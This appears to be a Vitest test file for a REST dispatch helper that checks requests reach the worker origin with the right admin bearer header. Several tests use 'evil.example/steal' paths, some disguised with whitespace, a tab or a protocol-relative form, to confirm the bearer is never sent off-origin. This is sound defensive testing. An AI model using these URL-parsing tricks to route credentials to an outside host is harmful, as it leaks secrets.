import { LunoraClient } from "@lunora/client";
import { afterEach, describe, expect, it, vi } from "vitest";

import { resolveOrigin } from "../../src/lib/internal";
import restDispatch from "../../src/lib/rest-dispatch";

const operation = { httpPath: "/api/health", method: "GET" };

/** A fetch stub resolving with a JSON body; records its call for assertions. */
const stubFetch = (): ReturnType<typeof vi.fn> => {
    const stub = vi.fn<() => Promise<{ text: () => Promise<string> }>>().mockResolvedValue({ text: async () => JSON.stringify({ ok: true }) });

    vi.stubGlobal("fetch", stub);

    return stub;
};

describe("restDispatch", () => {
    afterEach(() => {
        vi.unstubAllGlobals();
    });

    it("fetches the absolute URL on the worker origin", async () => {
        expect.assertions(2);

        const stub = stubFetch();

        const value = await restDispatch(operation, {}, "http://127.0.0.1:8787", "secret");

        expect(stub).toHaveBeenCalledWith("http://127.0.0.1:8787/api/health", expect.anything());
        expect(value).toStrictEqual({ ok: true });
    });

    it("sends the admin bearer alongside the content-type when a token is set", async () => {
        expect.assertions(1);

        const stub = stubFetch();

        await restDispatch({ ...operation, method: "POST" }, { a: 1 }, "http://127.0.0.1:8787", "secret");

        expect(stub).toHaveBeenCalledWith("http://127.0.0.1:8787/api/health", {
            body: JSON.stringify({ a: 1 }),
            headers: { authorization: "Bearer secret", "content-type": "application/json" },
            method: "POST",
        });
    });

    it("omits the authorization header when the token is empty", async () => {
        expect.assertions(1);

        const stub = stubFetch();

        await restDispatch(operation, {}, "http://127.0.0.1:8787", "");

        expect(stub).toHaveBeenCalledWith("http://127.0.0.1:8787/api/health", { body: undefined, headers: {}, method: "GET" });
    });

    it("lands on the worker when the client is built the way the app builds it", async () => {
        expect.assertions(2);

        const stub = stubFetch();

        // The real wiring: `app.tsx` constructs the client from
        // `resolveOrigin(baseUrl)` and sets the admin token on it, then the
        // try-it console hands `client.url` / `client.getAuthToken()` here. A
        // deployed studio supplies `baseUrl` (the worker), which is the case a
        // hand-passed literal would not prove.
        const client = new LunoraClient({ url: resolveOrigin("http://127.0.0.1:8787") });

        client.setAuthToken("secret");

        await restDispatch(operation, {}, client.url, client.getAuthToken());

        expect(stub).toHaveBeenCalledWith("http://127.0.0.1:8787/api/health", expect.anything());
        expect(client.url).toBe("http://127.0.0.1:8787");

        client.close();
    });

    it("refuses an absolute httpPath that would carry the bearer off-origin", async () => {
        expect.assertions(2);

        const stub = stubFetch();

        await expect(restDispatch({ httpPath: "http://evil.example/steal", method: "GET" }, {}, "http://127.0.0.1:8787", "secret")).rejects.toThrow(
            "off-origin",
        );

        expect(stub).not.toHaveBeenCalled();
    });

    it("refuses an absolute httpPath even when no origin was resolved", async () => {
        expect.assertions(2);

        const stub = stubFetch();

        // The empty-origin case used to skip the guard entirely and fetch the
        // path as written, sending the admin bearer to whatever host it names.
        await expect(restDispatch({ httpPath: "http://evil.example/steal", method: "GET" }, {}, "", "secret")).rejects.toThrow("off-origin");

        expect(stub).not.toHaveBeenCalled();
    });

    it("refuses a protocol-relative httpPath when no origin was resolved", async () => {
        expect.assertions(2);

        const stub = stubFetch();

        await expect(restDispatch({ httpPath: "//evil.example/steal", method: "GET" }, {}, "", "secret")).rejects.toThrow("off-origin");

        expect(stub).not.toHaveBeenCalled();
    });

    it("refuses an absolute httpPath hidden behind leading whitespace", async () => {
        expect.assertions(2);

        const stub = stubFetch();

        // WHATWG URL parsing strips leading C0-and-space, so the raw string does
        // not look absolute to a naive check but reaches the network as
        // `http://evil.example/steal` — with the bearer attached.
        await expect(restDispatch({ httpPath: "  http://evil.example/steal", method: "GET" }, {}, "", "secret")).rejects.toThrow("off-origin");

        expect(stub).not.toHaveBeenCalled();
    });

    it("refuses an absolute httpPath hidden behind an embedded tab", async () => {
        expect.assertions(2);

        const stub = stubFetch();

        // Tab/CR/LF are removed from ANYWHERE in the input by the URL parser, so
        // this reaches the network as `http://evil.example/steal` too.
        await expect(restDispatch({ httpPath: "htt\tp://evil.example/steal", method: "GET" }, {}, "", "secret")).rejects.toThrow("off-origin");

        expect(stub).not.toHaveBeenCalled();
    });

    it("still fetches a relative httpPath when no origin was resolved", async () => {
        expect.assertions(2);

        const stub = stubFetch();

        await restDispatch(operation, {}, "", "secret");

        expect(stub).toHaveBeenCalledTimes(1);
        expect(stub.mock.calls[0]?.[0]).toBe("/api/health");
    });
});
